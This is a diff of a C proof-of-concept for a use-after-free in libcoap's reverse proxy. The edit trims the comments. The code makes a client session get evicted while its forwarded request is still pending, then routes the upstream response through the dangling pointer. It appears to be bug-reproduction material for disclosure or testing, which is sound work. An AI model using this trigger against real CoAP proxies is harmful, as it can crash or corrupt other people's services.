@@ -1,19 +1,4 @@
-/*
- * Bug B: libcoap proxy use-after-free when no event handler is registered.
- *
- * A forwarded request is recorded in a proxy_req entry that stores the incoming
- * client session pointer without taking a reference. That entry is only cleaned
- * up via coap_proxy_remove_association(), which the library calls from inside
- *     if (context->handle_event) { ... }     (coap_net.c:4362, v4.3.5)
- * So if the proxy app never registers an event handler, the cleanup never runs.
- * When the client session is then reaped, the proxy_req keeps a dangling pointer,
- * and the upstream response dereferences it -> use-after-free.
- *
- * A single in-flight request is enough. Live on 4.3.5 and develop HEAD.
- *
- * Build: make poc-bug-b      (links the ASan-instrumented 4.3.5 lib)
- * Run:   ./poc-bug-b         (expect an ASan heap-use-after-free report)
- */
+/* Bug B: libcoap proxy UAF — cleanup gated on a registered event handler; none = dangling proxy_req. */
 #include <netinet/in.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -23,16 +8,14 @@
 #define ORIGIN_PORT 5701
 #define PROXY_PORT  5700
 
-/* Reverse proxy that forwards everything to ORIGIN. */
 static coap_proxy_server_t      rp_entry;
 static coap_proxy_server_list_t reverse_proxy = {
     .entry = &rp_entry,
     .entry_count = 1,
     .type = COAP_PROXY_REVERSE,
-    .track_client_session = 0,   /* shared proxy_entry keyed by upstream URI -> the bug */
+    .track_client_session = 0,
 };
 
-/* ORIGIN answers any GET with a short payload. */
 static void
 origin_get(coap_resource_t *r COAP_UNUSED, coap_session_t *s COAP_UNUSED,
            const coap_pdu_t *req COAP_UNUSED, const coap_string_t *q COAP_UNUSED,
@@ -41,7 +24,6 @@ origin_get(coap_resource_t *r COAP_UNUSED, coap_session_t *s COAP_UNUSED,
   coap_add_data(resp, 5, (const uint8_t *)"hello");
 }
 
-/* PROXY forwards the request upstream. */
 static void
 proxy_handler(coap_resource_t *res, coap_session_t *s, const coap_pdu_t *req,
               const coap_string_t *q COAP_UNUSED, coap_pdu_t *resp) {
@@ -49,7 +31,6 @@ proxy_handler(coap_resource_t *res, coap_session_t *s, const coap_pdu_t *req,
     fprintf(stderr, "forward_request failed\n");
 }
 
-/* PROXY forwards the upstream response back to the client (the UAF deref). */
 static coap_response_t
 proxy_response(coap_session_t *s, const coap_pdu_t *sent COAP_UNUSED,
                const coap_pdu_t *recv, const coap_mid_t id COAP_UNUSED) {
@@ -89,7 +70,6 @@ send_get(coap_session_t *s, const uint8_t *tok, size_t toklen) {
   coap_send(s, p);
 }
 
-/* Run the IO loop n times over the given contexts (NULL-terminated). */
 static void
 pump(int n, coap_context_t **ctxs) {
   for (int i = 0; i < n; i++)
@@ -113,28 +93,24 @@ main(void) {
   coap_add_resource(origin, ores);
 
   coap_context_t *proxy = make_server(PROXY_PORT);
-  coap_context_set_max_idle_sessions(proxy, 1);   /* evict once a 2nd client shows up */
+  coap_context_set_max_idle_sessions(proxy, 1);
   coap_add_resource(proxy, coap_resource_reverse_proxy_init(proxy_handler, 0));
   coap_register_response_handler(proxy, proxy_response);
-  /* No coap_register_event_handler() -> proxy cleanup is gated off. */
+  /* No event handler -> proxy cleanup gated off. */
 
   coap_context_t *client = coap_new_context(NULL);
 
-  /* 1. Client S sends one GET. Forward it upstream, but don't let ORIGIN answer
-   *    yet (it is not pumped), so the proxy_req entry stays in flight. */
+  /* 1. Client S sends one GET; ORIGIN not pumped -> proxy_req stays in flight. */
   coap_session_t *S = make_client(client, PROXY_PORT);
   send_get(S, (const uint8_t *)"\x11\x11\x11\x11", 4);
   { coap_context_t *cp[] = {client, proxy, NULL}; pump(12, cp); }
 
-  /* 2. A second client connects. The proxy already has one idle session (S),
-   *    which is >= max_idle_sessions, so S is evicted and freed. With no event
-   *    handler, the proxy_req for S is NOT cleaned up -> its pointer dangles. */
+  /* 2. Second client evicts+frees S; proxy_req not cleaned up -> dangles. */
   coap_session_t *S2 = make_client(client, PROXY_PORT);
   send_get(S2, (const uint8_t *)"\x33\x33\x33\x33", 4);
   { coap_context_t *cp[] = {client, proxy, NULL}; pump(12, cp); }
 
-  /* 3. Let ORIGIN answer. The proxy forwards the response through the dangling
-   *    incoming pointer -> use-after-free. */
+  /* 3. ORIGIN answers -> forward through dangling pointer -> UAF. */
   { coap_context_t *all[] = {origin, proxy, client, NULL}; pump(40, all); }
 
   coap_free_context(client);
